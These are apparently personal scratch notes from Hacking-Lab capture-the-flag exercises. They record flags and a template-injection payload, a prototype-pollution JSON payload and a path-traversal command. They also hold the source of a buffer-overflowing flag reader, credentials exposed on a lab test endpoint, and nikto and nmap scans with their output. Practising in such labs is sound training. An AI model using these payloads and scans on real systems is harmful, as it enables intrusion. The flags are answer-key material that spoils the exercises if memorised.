HLCR{s0m3_p30ple_pr0t0_s0me_pe0pl3_typ3}
HLCR{only_the_true_muffin_man_shall_extract_the_flag_from_the_stone_of_undisclosed_vulnerabilities}
2.  {% set logged_in = true %}{% include 'flag.html' %}

{"spell": {

"proto" : {

"was_effective" : true
}
}
}

Exploitation - It'a all relative
HLCR{1t's_411_r314t1ve...}
#include <stdio.h> #include <string.h> #define valid_permission_len 3 const char *valid_permission = "yes"; void read_flag(FILE *flag_file, char* flag_content); void read_permissions(FILE *permission_file, char* current_permission); void solve(char* current_permission, char* flag_content); int main() { char flag_content[99]; char current_permission[10];  FILE * flag_file;  FILE * permission_file;  flag_file = fopen("/root/flag.txt" , "r");  read_flag(flag_file, flag_content);  permission_file = fopen("./flag-reader.txt" , "r");  read_permissions(permission_file, current_permission);  solve(current_permission, flag_content); return 0; } void read_flag(FILE *flag_file, char* flag_content) { if (flag_file) {while (fscanf(flag_file, "%s", flag_content) != EOF) {}  fclose(flag_file); } } void read_permissions(FILE *permission_file, char* current_permission) { if (permission_file) {for (int i = 0; i < 5; i++){ fscanf(permission_file, "%s", current_permission);  }  current_permission[5] = '\0';  fclose(permission_file); } } void solve(char* current_permission, char* flag_content){ if (!strncmp(current_permission, valid_permission, valid_permission_len)) { printf("You have the right permissions.\n%s\n", flag_content); } else {printf("You do not have sufficient permissions to view the flag.\n"); } }

./../../bin/flag-reader



http://152.96.7.141:8000/robots.txt
User-agent: *
Disallow: /flag
Disallow: /admin
Disallow: /test

http://152.96.7.141:8000/admin
+--------------------+---------------------+---------+----------------+---------------+
|    System/Tool     |       Author        | Version | Responsibility | Comment       |
+--------------------+---------------------+---------+----------------+---------------+
| Node               | Ryan Dahl           | 14.16   | Marcel         | Update planed |
| Go                 | Google              | 1.13.0  | Rebecca        | -             |
| HA Proxy           | Willy Tarreau       | 2.0.5   | Roberto        | -             |
| Visual Studio Code | Microsoft           | 1.62.2  | Marcel         | -             |
| Caddy              | Willy Tarreau       | 2.0.0   | Jessi          | Webserver     |
| Netcat             | Hobbit/Eric Jackson | OpenBSD | Roberto        | -             |
| OpenSSL            | OpenSSL Dev. Team   | 1.1.1f  | Jessi          | -             |
| Alpine             | Alpine Dev. Team    | 3.14    | Roberto        | -             |
+--------------------+---------------------+---------+----------------+---------------+


http://152.96.7.141:8000/test
This is a test endpoint for system administrators.
Please use it with caution.
Username: donald
Password: be-nice-123


# What? Does That reallt work?
http://
5c28cc0c-b2dd-4d93-a706-64e6076284df.rdocker.vuln.land:80/ ->bild name
49d1c888-8109-4d12-ad49-f980cfc29b30.rdocker.vuln.land -> aus resources

verunden

http://4800c808-8009-4d12-a500-608007428010.rdocker.vuln.land

49d1c88881094d12ad49f980cfc29b30

xor

http://15f90484-33d4-0081-0a4f-9d66c8a01fef.rdocker.vuln.land

or

http://5df9cc8c-b3dd-4d93-af4f-fde6cfe29fff.rdocker.vuln.land

// new address
dbcca131-8117-44ee-9746-1a40b4f0f0d8.rdocker.vuln.land

 // new approach
nikto -host http://152.96.7.2 -C

// 4 ports open 80 and 3000, 4786, 8001
nmap -p-3000 -A -v 152.96.7.2
      

80/tcp open http nginx 1.18.0

| http-methods: 

|_ Supported Methods: GET HEAD POST OPTIONS

|_http-title: Site doesn't have a title (text/html; charset=utf-8).

|_http-server-header: nginx/1.18.0

3000/tcp open http Node.js (Express middleware)

|_http-title: Site doesn't have a title (text/html; charset=utf-8).

| http-methods: 

|_ Supported Methods: GET HEAD POST OPTIONS

4786/tcp filtered smart-install

8001/tcp filtered vcom-tunnel

https://github.com/Toboxos/ctf-writeups/blob/main/HackTheVote2020/Dotlocker1.md

also tried this:
https://medium.com/infosec-adventures/node-walkthrough-6b41f931c2da
3000/api